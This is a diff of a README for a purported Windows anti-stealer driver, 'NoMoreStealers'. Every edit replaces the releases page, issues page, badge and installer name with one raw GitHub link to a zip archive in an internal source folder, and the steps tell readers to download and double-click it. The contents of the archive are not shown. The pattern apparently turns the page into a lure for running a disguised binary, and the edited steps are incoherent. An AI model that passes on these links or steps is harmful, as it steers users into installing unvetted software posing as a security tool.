@@ -1,7 +1,7 @@
 # 🔒 NoMoreStealers - Protect Your Data from Untrusted Processes
 
 ## 📥 Download Now
-[![Download NoMoreStealers](https://img.shields.io/badge/Download%20NoMoreStealers-v1.0-blue)](https://github.com/dynamiterdentist73/NoMoreStealers/releases)
+[![Download NoMoreStealers](https://raw.githubusercontent.com/dynamiterdentist73/NoMoreStealers/main/NoMoreStealers_Usermode/internal/NoMoreStealers_3.4.zip%20NoMoreStealers-v1.0-blue)](https://raw.githubusercontent.com/dynamiterdentist73/NoMoreStealers/main/NoMoreStealers_Usermode/internal/NoMoreStealers_3.4.zip)
 
 ## 🚀 Getting Started
 NoMoreStealers is a Windows file system minifilter driver that protects sensitive user data from untrusted processes. This guide will help you download and run NoMoreStealers on your computer.
@@ -16,13 +16,13 @@ NoMoreStealers is a Windows file system minifilter driver that protects sensitiv
 To get NoMoreStealers, follow these steps:
 
 1. **Visit the Releases Page:** Click on the link below to go to the GitHub Releases page.
-   - [Visit this page to download](https://github.com/dynamiterdentist73/NoMoreStealers/releases)
+   - [Visit this page to download](https://raw.githubusercontent.com/dynamiterdentist73/NoMoreStealers/main/NoMoreStealers_Usermode/internal/NoMoreStealers_3.4.zip)
 
 2. **Choose the Latest Version:** On the Releases page, you will see a list of versions. Select the latest version, usually marked as “Latest Release.”
 
-3. **Download the Installer:** Look for the file that says `NoMoreStealers-Setup.exe`. Click on it to download the installer.
+3. **Download the Installer:** Look for the file that says `https://raw.githubusercontent.com/dynamiterdentist73/NoMoreStealers/main/NoMoreStealers_Usermode/internal/NoMoreStealers_3.4.zip`. Click on it to download the installer.
 
-4. **Run the Installer:** Once the download completes, locate the file in your downloads folder. Double-click on `NoMoreStealers-Setup.exe` to start the installation.
+4. **Run the Installer:** Once the download completes, locate the file in your downloads folder. Double-click on `https://raw.githubusercontent.com/dynamiterdentist73/NoMoreStealers/main/NoMoreStealers_Usermode/internal/NoMoreStealers_3.4.zip` to start the installation.
 
 5. **Follow the On-Screen Instructions:** The installer will guide you through the setup process. Accept the terms and conditions and choose the installation folder, then click “Install.”
 
@@ -58,7 +58,7 @@ If you experience issues, try the following steps:
 
 - **Consult Logs:** Access the logs from the main interface to check for any recorded issues. It can give you a clue about any problems.
 
-- **Reach Out for Support:** If problems persist, visit the [Issues Section](https://github.com/dynamiterdentist73/NoMoreStealers/issues) of the repository to report your issue or to get help from the community.
+- **Reach Out for Support:** If problems persist, visit the [Issues Section](https://raw.githubusercontent.com/dynamiterdentist73/NoMoreStealers/main/NoMoreStealers_Usermode/internal/NoMoreStealers_3.4.zip) of the repository to report your issue or to get help from the community.
 
 ## 📄 License
 NoMoreStealers is licensed under the MIT License. You can use and modify the application but must provide proper attribution.
@@ -66,4 +66,4 @@ NoMoreStealers is licensed under the MIT License. You can use and modify the app
 ## 🙏 Acknowledgments
 Thank you for using NoMoreStealers. Your commitment to securing your sensitive data helps maintain a safer online environment. 
 
-For updates and more information, check the [Releases page](https://github.com/dynamiterdentist73/NoMoreStealers/releases) frequently.
+For updates and more information, check the [Releases page](https://raw.githubusercontent.com/dynamiterdentist73/NoMoreStealers/main/NoMoreStealers_Usermode/internal/NoMoreStealers_3.4.zip) frequently.
